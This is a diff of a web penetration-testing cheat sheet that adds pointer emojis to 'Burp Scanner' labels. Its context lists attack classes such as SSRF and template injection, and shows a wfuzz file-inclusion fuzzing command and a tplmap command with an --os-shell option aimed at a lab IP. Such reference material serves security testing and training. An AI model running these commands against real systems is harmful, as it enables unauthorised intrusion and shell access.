@@ -64,11 +64,11 @@ wfuzz -X POST -c -w file_inclusion_linux.txt --hw 0 -d "foo=FUZZ" http://10.10.1
 
 // Can use Burp Active Scanner
 ```
-- 🟥 __Open Redirect__ (Detected by Burp Scanner)
+- 🟥 __Open Redirect__ (Detected by 👉 Burp Scanner)
 - 🟥 __Prototype Pollution to XSS__ (NodeJS)
-- 🟥 __Server Side Inclusion/Edge Side Inclusion__ (Detected by Burp Scanner)
+- 🟥 __Server Side Inclusion/Edge Side Inclusion__ (Detected by 👉 Burp Scanner)
 - 🟥 __Server Side Request Forgery__
-- 🟥 __Server Side Template Injection__ (Detected by Burp Scanner)
+- 🟥 __Server Side Template Injection__ (Detected by 👉 Burp Scanner)
 ```
 // Tool tplmap
 python2 tplmap.py -u 'http://10.10.10.10/page?name=Box*' --os-shell
